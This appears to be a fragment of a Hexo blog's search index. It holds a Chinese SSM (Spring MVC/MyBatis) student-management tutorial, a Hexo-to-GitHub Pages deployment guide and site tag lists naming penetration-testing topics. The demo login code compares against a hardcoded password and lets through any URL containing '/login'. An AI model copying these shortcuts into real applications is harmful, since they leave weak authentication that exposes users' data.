getAddress() &#123; return address; &#125; public void setAddress(String address) &#123; this.address = address; &#125; public Integer getStatus() &#123; return status; &#125; public void setStatus(Integer status) &#123; this.status = status; &#125; @Override public String toString() &#123; return &quot;Students [id=&quot; + id + &quot;, name=&quot; + name + &quot;, age=&quot; + age + &quot;, gender=&quot; + gender + &quot;, number=&quot; + number + &quot;, address=&quot; + address + &quot;, status=&quot; + status + &quot;]&quot;; &#125; &#125; DAO层123456789101112131415161718192021222324252627package cn.zfy.eft.exp3.ssm.dao;import java.util.List;import cn.zfy.eft.exp3.ssm.po.Students;/** * 学生信息接口文件 * */public interface StudentsDao &#123; public Students findStudentsById(Integer id); public int deleteStudentsById(Integer id); public void addStudents(Students students); public void updateStudentsById(Students students); public List&lt;Students&gt; findall();&#125; DAO的映射：12345678910111213141516171819202122232425262728293031323334&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;cn.zfy.eft.exp3.ssm.dao.StudentsDao&quot;&gt; &lt;!-- 查询学生信息 --&gt; &lt;select id=&quot;findStudentsById&quot; parameterType=&quot;Integer&quot; resultType=&quot;Students&quot;&gt; select * from students where Id= #&#123;id&#125; &lt;/select&gt; &lt;!-- 查询所有学生信息 --&gt; &lt;select id=&quot;findall&quot; resultType=&quot;Students&quot;&gt; select * from students &lt;/select&gt; &lt;!-- 删除信息 --&gt; &lt;delete id=&quot;deleteStudentsById&quot; parameterType=&quot;Integer&quot;&gt; delete from students where Id=#&#123;id&#125; &lt;/delete&gt; &lt;!-- 更新信息 --&gt; &lt;update id=&quot;updateStudentsById&quot; parameterType=&quot;Students&quot;&gt; update students set name=#&#123;name&#125;,age=#&#123;age&#125;,gender=#&#123;gender&#125;,number=#&#123;number&#125;,address=#&#123;address&#125;,status=#&#123;status&#125; where Id=#&#123;id&#125; &lt;/update&gt; &lt;!-- 增加信息 --&gt; &lt;insert id=&quot;addStudents&quot; parameterType=&quot;Students&quot;&gt; insert into students(name,age,gender,number,address,status) values(#&#123;name&#125;,#&#123;age&#125;,#&#123;gender&#125;,#&#123;number&#125;,#&#123;address&#125;,#&#123;status&#125;) &lt;/insert&gt;&lt;/mapper&gt; Service：123456789101112131415161718192021package cn.zfy.eft.exp3.ssm.service;import java.util.List;import cn.zfy.eft.exp3.ssm.po.Students;public interface StudentsService &#123; public Students findStudentsById(Integer id); public void addStudents(Students students); public void updateStudentsById(Students students); public int deleteStudentsById(Integer id); public List&lt;Students&gt; findall(); &#125; Service的接口实现：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package cn.zfy.eft.exp3.ssm.service.Impl;import java.util.List;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Service;import org.springframework.transaction.annotation.Transactional;import cn.zfy.eft.exp3.ssm.dao.StudentsDao;import cn.zfy.eft.exp3.ssm.po.Students;import cn.zfy.eft.exp3.ssm.service.StudentsService;@Service@Transactionalpublic class StudentsServiceImpl implements StudentsService &#123; // 注解注入StudentsDao @Autowired private StudentsDao studentsDao; public void setStudentsDao(StudentsDao studentsDao) &#123; this.studentsDao = studentsDao; &#125; @Override public Students findStudentsById(Integer id) &#123; return this.studentsDao.findStudentsById(id); &#125; //删除信息 @Override public int deleteStudentsById(Integer id) &#123; int row = studentsDao.deleteStudentsById(id); System.out.println(row); return row; &#125; //更新信息 @Override public void updateStudentsById(Students students) &#123; studentsDao.updateStudentsById(students); &#125; //添加信息 @Override public void addStudents(Students students) &#123; // TODO 自动生成的方法存根 studentsDao.addStudents(students); &#125; //列表信息 @Override public List&lt;Students&gt; findall() &#123; // TODO 自动生成的方法存根 return this.studentsDao.findall(); &#125;&#125; Controller：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576package cn.zfy.eft.exp3.ssm.controller;import java.util.List;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.servlet.ModelAndView;import cn.zfy.eft.exp3.ssm.po.Students;import cn.zfy.eft.exp3.ssm.service.StudentsService;@Controllerpublic class StudentsController &#123; @Autowired private StudentsService studentsService; /** * 根据id查学生详情 */ @RequestMapping(&quot;/findStudentsById&quot;) public String findStudentsById(Integer id, Model model) &#123; Students students = studentsService.findStudentsById(id); model.addAttribute(&quot;students&quot;, students); // 返回学生信息展示页面 return &quot;students&quot;; &#125; // 删除信息 @RequestMapping(&quot;/deleteStudentsById&quot;) public String deleteStudentById(Integer id, Model model) &#123; int row = studentsService.deleteStudentsById(id); if (row &gt; 0) return &quot;success&quot;; else return &quot;fail&quot;; &#125; // 修改信息 @RequestMapping(&quot;/updateStudentsById&quot;) public String updateStudentsById(Students students, Model model) &#123; studentsService.updateStudentsById(students); return &quot;success&quot;; &#125; @RequestMapping(&quot;/addStudents&quot;) public String addStudentsById(Students students,Model model)&#123; studentsService.addStudents(students); return &quot;success&quot;; &#125; @RequestMapping(&quot;/findall&quot;) public ModelAndView stuList() &#123; ModelAndView modelAndView = new ModelAndView(); List&lt;Students&gt; list; list = studentsService.findall(); modelAndView.addObject(&quot;students&quot;, list); modelAndView.setViewName(&quot;studentsindex&quot;); return modelAndView; &#125; @RequestMapping(&quot;/addStudentsindex&quot;) public String addStudentsindex() &#123; return &quot;addStudents&quot;; &#125; @RequestMapping(&quot;/updateStudents&quot;) public String updateStudents(Integer id, Model model) &#123; Students students = studentsService.findStudentsById(id); model.addAttribute(&quot;students&quot;, students); return &quot;updateStudents&quot;; &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960package cn.zfy.eft.exp3.ssm.controller;import javax.servlet.http.HttpSession;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestMethod;import cn.zfy.eft.exp3.ssm.po.User;@Controllerpublic class UserController &#123; /** * 向用户登录页面跳转 */ @RequestMapping(value=&quot;/login&quot;,method=RequestMethod.GET) public String toLogin() &#123; return &quot;login&quot;; &#125; /** * 用户登录 */ @RequestMapping(value=&quot;/login&quot;,method=RequestMethod.POST) public String login(User user,Model model,HttpSession session) &#123; // 获取用户名和密码 String username = user.getUsername(); String password = user.getPassword(); // 此处模拟从数据库中获取用户名和密码后进行判断 if(username != null &amp;&amp; username.equals(&quot;zhufuyi&quot;) &amp;&amp; password != null &amp;&amp; password.equals(&quot;123456&quot;))&#123; // 将用户对象添加到Session session.setAttribute(&quot;USER_SESSION&quot;, user); // 重定向到主页面的跳转方法 return &quot;redirect:main&quot;; &#125; model.addAttribute(&quot;msg&quot;, &quot;用户名或密码错误，请重新登录！&quot;); return &quot;login&quot;; &#125; /** * 向用户主页面跳转 */ @RequestMapping(value=&quot;/main&quot;) public String toMain() &#123; return &quot;main&quot;; &#125; /** * 退出登录 */ @RequestMapping(value = &quot;/logout&quot;) public String logout(HttpSession session) &#123; // 清除Session session.invalidate(); // 重定向到登录页面的跳转方法 return &quot;redirect:login&quot;; &#125;&#125; Interceptor拦截器：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950package cn.zfy.eft.exp3.ssm.interceptor;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.HttpSession;import org.springframework.web.servlet.HandlerInterceptor;import org.springframework.web.servlet.ModelAndView;import cn.zfy.eft.exp3.ssm.po.User;/** * 登录拦截器 */public class LoginInterceptor implements HandlerInterceptor&#123; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123; System.out.println(&quot;Logininterceptor------prehandle--------------&quot;); // 获取请求的URL String url = request.getRequestURI(); // URL:除了login.jsp是可以公开访问的，其它的URL都进行拦截控制 if(url.indexOf(&quot;/login&quot;)&gt;=0)&#123; return true; &#125; // 获取Session HttpSession session = request.getSession(); User user = (User) session.getAttribute(&quot;USER_SESSION&quot;); // 判断Session中是否有用户数据，如果有，则返回true,继续向下执行 if(user != null)&#123; return true; &#125; // 不符合条件的给出提示信息，并转发到登录页面 request.setAttribute(&quot;msg&quot;, &quot;您还没有登录，请先登录！&quot;); request.getRequestDispatcher(&quot;/WEB-INF/jsp/login.jsp&quot;) .forward(request, response); return false; &#125; @Override public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception &#123; &#125; @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception &#123; &#125;&#125; 配置文件：applicationContext.xml:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot; xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.3.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.3.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.3.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.3.xsd&quot;&gt; &lt;!-- 读取db.properties --&gt; &lt;context:property-placeholder location=&quot;classpath:db.properties&quot; /&gt; &lt;!-- 配置数据源 --&gt; &lt;bean id=&quot;dataSource&quot; class=&quot;org.apache.commons.dbcp2.BasicDataSource&quot;&gt; &lt;!--数据库驱动 --&gt; &lt;property name=&quot;driverClassName&quot; value=&quot;$&#123;jdbc.driver&#125;&quot; /&gt; &lt;!--连接数据库的url --&gt; &lt;property name=&quot;url&quot; value=&quot;$&#123;jdbc.url&#125;&quot; /&gt; &lt;!--连接数据库的用户名 --&gt; &lt;property name=&quot;username&quot; value=&quot;$&#123;jdbc.username&#125;&quot; /&gt; &lt;!--连接数据库的密码 --&gt; &lt;property name=&quot;password&quot; value=&quot;$&#123;jdbc.password&#125;&quot; /&gt; &lt;!--最大连接数 --&gt; &lt;property name=&quot;maxTotal&quot; value=&quot;$&#123;jdbc.maxTotal&#125;&quot; /&gt; &lt;!--最大空闲连接 --&gt; &lt;property name=&quot;maxIdle&quot; value=&quot;$&#123;jdbc.maxIdle&#125;&quot; /&gt; &lt;!--初始化连接数 --&gt; &lt;property name=&quot;initialSize&quot; value=&quot;$&#123;jdbc.initialSize&#125;&quot; /&gt; &lt;/bean&gt; &lt;!-- 事务管理器，依赖于数据源 --&gt; &lt;bean id=&quot;transactionManager&quot; class=&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;&gt; &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot; /&gt; &lt;/bean&gt; &lt;!-- 开启事务注解 --&gt; &lt;tx:annotation-driven transaction-manager=&quot;transactionManager&quot; /&gt; &lt;!-- 配置MyBatis工厂SqlSessionFactory --&gt; &lt;bean id=&quot;sqlSessionFactory&quot; class=&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;&gt; &lt;!--注入数据源 --&gt; &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot; /&gt; &lt;!--指定核MyBatis心配置文件位置 --&gt; &lt;property name=&quot;configLocation&quot; value=&quot;classpath:mybatis-config.xml&quot; /&gt; &lt;/bean&gt; &lt;!-- 配置mapper扫描器 --&gt; &lt;bean class=&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;&gt; &lt;property name=&quot;basePackage&quot; value=&quot;cn.zfy.eft.exp3.ssm.dao&quot; /&gt; &lt;/bean&gt; &lt;!-- 扫描Service --&gt; &lt;context:component-scan base-package=&quot;cn.zfy.eft.exp3.ssm.service&quot; /&gt;&lt;/beans&gt; mabatis-config.xml:12345678910&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE configuration PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;&lt;configuration&gt; &lt;!-- 别名定义 --&gt; &lt;typeAliases&gt; &lt;package name=&quot;cn.zfy.eft.exp3.ssm.po&quot; /&gt; &lt;/typeAliases&gt;&lt;/configuration&gt; springmvc-config.xml:123456789101112131415161718192021222324252627282930&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.3.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc-4.3.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.3.xsd&quot;&gt; &lt;!-- 配置包扫描器，扫描@Controller注解的类 --&gt; &lt;context:component-scan base-package=&quot;cn.zfy.eft.exp3.ssm.controller&quot; /&gt; &lt;!-- 加载注解驱动 --&gt; &lt;mvc:annotation-driven /&gt; &lt;!-- 配置视图解析器 --&gt; &lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt; &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/jsp/&quot; /&gt; &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot; /&gt; &lt;/bean&gt; &lt;!--配置拦截器 --&gt; &lt;mvc:interceptors&gt; &lt;mvc:interceptor&gt; &lt;mvc:mapping path=&quot;/**&quot; /&gt; &lt;bean class=&quot;cn.zfy.eft.exp3.ssm.interceptor.LoginInterceptor&quot; /&gt; &lt;/mvc:interceptor&gt; &lt;/mvc:interceptors&gt;&lt;/beans&gt;","categories":[],"tags":[{"name":"SSM","slug":"SSM","permalink":"http://example.com/tags/SSM/"}]},{"title":"hexo+github无法正常访问解决办法","slug":"hexo-github本地预览正常但是部署到github后无法正常访问解决办法","date":"2020-05-22T09:45:53.000Z","updated":"2022-04-08T16:52:17.236Z","comments":true,"path":"2020/05/22/hexo-github本地预览正常但是部署到github后无法正常访问解决办法/","permalink":"http://example.com/2020/05/22/hexo-github%E6%9C%AC%E5%9C%B0%E9%A2%84%E8%A7%88%E6%AD%A3%E5%B8%B8%E4%BD%86%E6%98%AF%E9%83%A8%E7%BD%B2%E5%88%B0github%E5%90%8E%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E8%AE%BF%E9%97%AE%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/","excerpt":"HEXO+GITHUB本地预览正常但是部署到GITHUB后无法正常访问解决办法从注册Github讲起","text":"HEXO+GITHUB本地预览正常但是部署到GITHUB后无法正常访问解决办法从注册Github讲起 HEXO+GITHUB本地预览正常但是部署到GITHUB后无法正常访问解决办法从注册Github讲起 1.创建指定的GITHUB仓库仓库名称和名字必须一样，举栗 Owner:16778738 Repository name:16778738.github.io 注意：Initialize this repository with a README勾选上 点击Create repository 2.确认开启GITHUB PAGES进入settings,找到Github Pages，如下字样 Your site is read to be published at https://16778738.github.io/ 仓库名称以github.io结尾默认开启Github Pages 3.在GITHUB上添加SSH KEYS信息为了能将个人博客服务器上的博客信息推到Github，需要把服务器的SSH Keys信息在Github上添加信任 本地服务器创建ssh-key信息 ssh-keygen -t rsa#遇到等待输入的地方直接Enter,无需其他输入 生成ssh信息后 进入到文件夹 cd .ssh&#x2F; 查看文件夹下id_rsa.pub公钥文件内容 cat id_rsa.pub 将显示的所有内容复制等待粘贴到Github上 4.GITHUB添加SSH KEYSSettings中找到Deploy Keys Add Deploy Keys,将复制的内容粘贴，Title随便写，小勾勾选上 添加成功 5.GITHUB 连接测试ssh -T &#103;&#105;&#116;&#x68;&#x75;&#98;&#64;&#x67;&#105;&#116;&#x68;&#x75;&#x62;&#x2e;&#99;&#x6f;&#109; 确认连接？YES 最后一行显示成功连接 6.设置你的账号信息git config –global user.name “16778738” git config –global user.email “&#49;&#54;&#55;&#55;&#x38;&#55;&#51;&#56;&#x40;&#113;&#x71;&#x2e;&#x63;&#x6f;&#x6d;“ 7.安装如下扩展npm install hexo-deployer-git –save 8.HEXO部署到 GITHUB PAGESvim _config.yml 找到#Deployment(按一下i进入编辑状态，以下信息编辑完了，Esc键退出输入字符’:wq!’保存退出) deploy:#这行空着 type: git#类型写git #下面接着新加两行 repo: &#x67;&#105;&#x74;&#64;&#103;&#x69;&#116;&#x68;&#x75;&#x62;&#x2e;&#99;&#x6f;&#x6d;:16778738&#x2F;github.io.git branch: master 9.连接成功hexo clean#清理一下 hexo g#生成静态文件 hexo deploy#部署到Github","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"http://example.com/tags/hexo/"}]}],"categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"后渗透","slug":"渗透测试/后渗透","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/"},{"name":"msf","slug":"渗透测试/后渗透/msf","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/msf/"},{"name":"提权","slug":"渗透测试/后渗透/msf/提权","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/msf/%E6%8F%90%E6%9D%83/"},{"name":"信息收集","slug":"渗透测试/信息收集","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"Windows","slug":"渗透测试/后渗透/Windows","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/Windows/"},{"name":"Linux","slug":"渗透测试/后渗透/Windows/Linux","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/Windows/Linux/"},{"name":"免杀","slug":"渗透测试/后渗透/msf/免杀","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/msf/%E5%85%8D%E6%9D%80/"},{"name":"Linux","slug":"Linux","permalink":"http://example.com/categories/Linux/"},{"name":"msf","slug":"渗透测试/msf","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/msf/"},{"name":"免杀","slug":"渗透测试/免杀","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"struts2","slug":"漏洞复现/struts2","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/struts2/"},{"name":"xray","slug":"渗透测试/xray","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/xray/"},{"name":"Nginx","slug":"Nginx","permalink":"http://example.com/categories/Nginx/"},{"name":"hexo","slug":"hexo","permalink":"http://example.com/categories/hexo/"},{"name":"github","slug":"hexo/github","permalink":"http://example.com/categories/hexo/github/"},{"name":"博客","slug":"hexo/github/博客","permalink":"http://example.com/categories/hexo/github/%E5%8D%9A%E5%AE%A2/"},{"name":"git","slug":"git","permalink":"http://example.com/categories/git/"},{"name":"Docker","slug":"Docker","permalink":"http://example.com/categories/Docker/"},{"name":"内网安全","slug":"渗透测试/内网安全","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"},{"name":"redis","slug":"redis","permalink":"http://example.com/categories/redis/"}],"tags":[{"name":"msf","slug":"msf","permalink":"http://example.com/tags/msf/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"后渗透","slug":"后渗透","permalink":"http://example.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"},{"name":"提权","slug":"提权","permalink":"http://example.com/tags/%E6%8F%90%E6%9D%83/"},{"name":"信息收集","slug":"信息收集","permalink":"http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"},{"name":"免杀","slug":"免杀","permalink":"http://example.com/tags/%E5%85%8D%E6%9D%80/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"struts2","slug":"struts2","permalink":"http://example.com/tags/struts2/"},{"name":"xray","slug":"xray","permalink":"http://example.com/tags/xray/"},{"name":"Nginx","slug":"Nginx","permalink":"http://example.com/tags/Nginx/"},{"name":"hexo","slug":"hexo","permalink":"http://example.com/tags/hexo/"},{"name":"github","slug":"github","permalink":"http://example.com/tags/github/"},{"name":"博客","slug":"博客","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"git","slug":"git","permalink":"http://example.com/tags/git/"},{"name":"Docker端口映射","slug":"Docker端口映射","permalink":"http://example.com/tags/Docker%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84/"},{"name":"Docker","slug":"Docker","permalink":"http://example.com/tags/Docker/"},{"name":"Cobalt Strike","slug":"Cobalt-Strike","permalink":"http://example.com/tags/Cobalt-Strike/"},{"name":"工具","slug":"工具","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7/"},{"name":"cve","slug":"cve","permalink":"http://example.com/tags/cve/"},{"name":"weblogic","slug":"weblogic","permalink":"http://example.com/tags/weblogic/"},{"name":"靶机","slug":"靶机","permalink":"http://example.com/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"JNDI-Injection-Exploit","slug":"JNDI-Injection-Exploit","permalink":"http://example.com/tags/JNDI-Injection-Exploit/"},{"name":"nmap","slug":"nmap","permalink":"http://example.com/tags/nmap/"},{"name":"xss","slug":"xss","permalink":"http://example.com/tags/xss/"},{"name":"挖洞","slug":"挖洞","permalink":"http://example.com/tags/%E6%8C%96%E6%B4%9E/"},{"name":"万能密码","slug":"万能密码","permalink":"http://example.com/tags/%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/"},{"name":"openssl","slug":"openssl","permalink":"http://example.com/tags/openssl/"},{"name":"wpscan","slug":"wpscan","permalink":"http://example.com/tags/wpscan/"},{"name":"CVE","slug":"CVE","permalink":"http://example.com/tags/CVE/"},{"name":"Kindeditor","slug":"Kindeditor","permalink":"http://example.com/tags/Kindeditor/"},{"name":"beef","slug":"beef","permalink":"http://example.com/tags/beef/"},{"name":"内网渗透","slug":"内网渗透","permalink":"http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"cs","slug":"cs","permalink":"http://example.com/tags/cs/"},{"name":"kali","slug":"kali","permalink":"http://example.com/tags/kali/"},{"name":"PhpMyAdmin","slug":"PhpMyAdmin","permalink":"http://example.com/tags/PhpMyAdmin/"},{"name":"centos","slug":"centos","permalink":"http://example.com/tags/centos/"},{"name":"centos8","slug":"centos8","permalink":"http://example.com/tags/centos8/"},{"name":"-go","slug":"go","permalink":"http://example.com/tags/go/"},{"name":"命令","slug":"命令","permalink":"http://example.com/tags/%E5%91%BD%E4%BB%A4/"},{"name":"namp","slug":"namp","permalink":"http://example.com/tags/namp/"},{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"面试题","slug":"面试题","permalink":"http://example.com/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"name":"redis","slug":"redis","permalink":"http://example.com/tags/redis/"},{"name":"Redis","slug":"Redis","permalink":"http://example.com/tags/Redis/"},{"name":"Pycharm","slug":"Pycharm","permalink":"http://example.com/tags/Pycharm/"},{"name":"漏洞","slug":"漏洞","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"Http","slug":"Http","permalink":"http://example.com/tags/Http/"},{"name":"Js加密破解","slug":"Js加密破解","permalink":"http://example.com/tags/Js%E5%8A%A0%E5%AF%86%E7%A0%B4%E8%A7%A3/"},{"name":"eval","slug":"eval","permalink":"http://example.com/tags/eval/"},{"name":"计算机网络","slug":"计算机网络","permalink":"http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"requests","slug":"requests","permalink":"http://example.com/tags/requests/"},{"name":"Mysql","slug":"Mysql","permalink":"http://example.com/tags/Mysql/"},{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"},{"name":"win10","slug":"win10","permalink":"http://example.com/tags/win10/"},{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"},{"name":"项目","slug":"项目","permalink":"http://example.com/tags/%E9%A1%B9%E7%9B%AE/"},{"name":"jQuery","slug":"jQuery","permalink":"http://example.com/tags/jQuery/"},{"name":"Jquery","slug":"Jquery","permalink":"http://example.com/tags/Jquery/"},{"name":"Django","slug":"Django","permalink":"http://example.com/tags/Django/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"},{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"},{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"需求工程","slug":"需求工程","permalink":"http://example.com/tags/%E9%9C%80%E6%B1%82%E5%B7%A5%E7%A8%8B/"},{"name":"SSM","slug":"SSM","permalink":"http://example.com/tags/SSM/"}]}